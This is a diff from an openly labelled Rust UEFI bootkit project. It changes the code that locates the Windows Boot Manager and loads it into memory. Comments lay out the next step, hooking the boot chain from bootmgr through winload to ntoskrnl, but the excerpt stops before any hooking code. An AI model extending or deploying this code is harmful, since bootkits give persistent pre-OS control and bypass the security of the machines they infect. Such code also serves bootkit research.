@@ -2,7 +2,7 @@
 #![no_std]
 
 use log;
-use uefi::prelude::*;
+use uefi::{prelude::*, table::boot::LoadImageSource};
 
 mod boot;
 
@@ -24,19 +24,22 @@ fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
         .clear()
         .expect("Failed to clear the stderr output screen.");
 
-    log::info!("UEFI Bootkit in Rust");
-    log::info!("Finding Windows EFI Boot Manager");
+    log::info!("### UEFI Bootkit in Rust ###");
 
     //
     // 1. Locate Windows EFI Boot Manager (\EFI\Microsoft\Boot\bootmgfw.efi)
     //
 
+    // Access boot services
+    let boot_services = system_table.boot_services();
+
+    log::info!("Finding Windows EFI Boot Manager (\\EFI\\Microsoft\\Boot\\bootmgfw.efi) device");
     // Gets the Windows EFI Boot Manager device as slice of bytes
     let bootmgr_data =
-        boot::get_windows_bootmgr_device("\\EFI\\Microsoft\\Boot\\bootmgfw.efi", &system_table)
+        boot::get_windows_bootmgr_device("\\EFI\\Microsoft\\Boot\\bootmgfw.efi", &boot_services)
             .expect("Failed to get device path");
-    log::info!("Pointer: {:p}", bootmgr_data.as_ptr());
-    log::info!("Size: {}", bootmgr_data.len());
+    log::info!("Found Windows EFI Boot Manager device");
+    log::info!("Pointer: {:p} Size: {}", bootmgr_data.as_ptr(), bootmgr_data.len());
 
     //
     // 2. Set BootCurrent to Windows Boot Manager (bootmgr) option
@@ -48,8 +51,18 @@ fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
     // 3. Load the Windows EFI Boot Manager (bootmgr)
     //
 
-    //todo:
-    //let loaded_image_handle = boot_services.load_image(boot_services.image_handle(), source);
+    log::info!("Loading Windows Boot Manager image into memory");
+    // Load an EFI image into memory and return a Handle to the image.
+    // There are two ways to load the image: by copying raw image data from a source buffer, or by loading the image via the SimpleFileSystem protocol
+    let _loaded_image_handle = boot_services.load_image(
+        image_handle,
+        LoadImageSource::FromBuffer {
+            buffer: &bootmgr_data,
+            file_path: None,
+        },
+    ).expect("Failed to load image");
+
+    log::info!("Successfully loaded Windows Boot Manager image into memory");
 
     //
     // 4. Set up the hook chain from bootmgr -> windload -> ntoskrnl
